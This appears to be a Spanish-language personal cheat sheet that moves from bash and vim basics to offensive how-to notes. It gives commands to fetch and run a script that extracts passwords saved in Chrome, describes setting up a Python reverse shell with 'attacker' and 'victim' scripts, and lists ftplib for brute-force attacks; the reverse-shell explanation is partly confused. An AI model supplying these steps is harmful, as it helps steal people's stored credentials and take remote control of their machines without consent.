## Script bash

Debe llevar encabezados:

```sh
#!/bin/bash
```

```sh
$ vim
$ :edit Readme.md
$ :x # reemplaza a -> :wq
$ vim  -> :set number o :set nu # enumera las lineas

```

Crear un archivo llamado .vimrc, este va a almacenar las configuraciones de indentatación - colores - tabs:

Este archivo se recargará cada vez que utilices la terminal.

```sh
set showmode
set autoindent
set tabstop=2
set expandtab
syntax on
```

# Obtener contraseñas almacenadas en el navegador:

1° descargar estas dependencias:

```sh
$ pip install sqlite
$ pip install pycryptodomex
$ pip install pywin32
```

```sh
$ curl https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py -o nombre_del_archivo.py

o 

$ wget https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py -o nombre_del_archivo.py
```

Ejecutar:

```sh
$ python nombre_del_archivo.py
```

Obtenemos las contraseñas del navegador...


### Principales librerías en Python:

- Para ReverseShell: socket
Ejemplo en: [ReverseShell_Python](https://github.com/Maalfer/ReverseShell_Python)

En el archivo atacante.py pongo la IP de la victima:

```py
server_address = ('IP-Victim', 5000)
```

NOTA: cuando tenemos la siguiente conexión, significa que estamos aceptando cualquier conexión IP privada.

```sh
0.0.0.0
```

Ejecutar:

Se va a quedar a la escucha
```sh
$ python3 victima.py
```

OS: para copiar comandos, controlar SO, acceder a las variables de entorno.

Ejemplo:

```py
import os

# esto se conectará al puerto indicado desde la máquina atacante a la victima:
os.system("python3 -m http.server 5000") 
```
ver: [Librerías](https://www.youtube.com/watch?v=TSkYt-kGj24)

- ftplib: para ataques de fuerza bruta



